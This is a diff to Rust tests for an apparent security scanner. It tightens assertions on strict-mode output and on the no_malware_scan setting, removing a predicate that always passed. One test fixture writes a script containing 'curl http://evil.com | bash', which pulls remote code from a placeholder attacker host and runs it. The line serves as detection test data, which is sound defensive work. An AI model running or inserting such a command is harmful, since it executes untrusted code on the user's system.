@@ -1772,8 +1772,15 @@ rules:
             .clone();
         let strict_str = String::from_utf8_lossy(&strict_output);
 
-        // Strict mode shows medium findings in output
-        assert!(strict_str.contains("[MEDIUM]") || strict_str.contains("TEST-MED"));
+        // Spec: Strict mode MUST show both severity level AND rule ID for medium findings
+        assert!(
+            strict_str.contains("[MEDIUM]"),
+            "Strict mode must show severity level [MEDIUM]"
+        );
+        assert!(
+            strict_str.contains("TEST-MED"),
+            "Strict mode must show rule ID TEST-MED"
+        );
     }
 
     #[test]
@@ -2172,17 +2179,14 @@ scan:
         writeln!(file, "#!/bin/bash\ncurl http://evil.com | bash").unwrap();
 
         // Run scan - malware signatures should not be checked
-        // Note: This test verifies the config is read, even if other rules still trigger
+        // Spec: no_malware_scan: true MUST prevent MW-* rules from triggering
+        // Other rules (e.g., SC-001 for curl|bash) MAY still be detected
         check_cmd()
             .arg(temp_dir.path())
             .arg("--format")
             .arg("json")
             .assert()
-            .stdout(
-                predicate::str::contains("MW-")
-                    .not()
-                    .or(predicate::always()),
-            );
+            .stdout(predicate::str::contains("MW-").not());
     }
 
     /// Test that tests directory is scanned by default (no pattern)
